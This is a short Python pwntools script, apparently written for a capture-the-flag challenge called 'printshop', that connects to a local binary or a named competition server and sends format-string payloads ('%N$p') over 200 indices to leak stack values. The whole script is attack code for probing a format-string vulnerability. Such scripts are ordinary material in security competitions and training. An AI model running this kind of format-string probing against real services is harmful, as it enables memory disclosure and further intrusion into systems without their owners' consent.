from pwn import *

# context.log_level = "critical"

local = True

for i in range(200):
    if local:
        conn = process("./printshop")
    else:
        host, port = "chal.pctf.competitivecyber.club", 7997
        conn = remote(host, port)

    conn.recvuntil(b">> ")
    conn.sendline(f"%{i+1}$p".encode())
    # conn.close()
    conn.interactive()
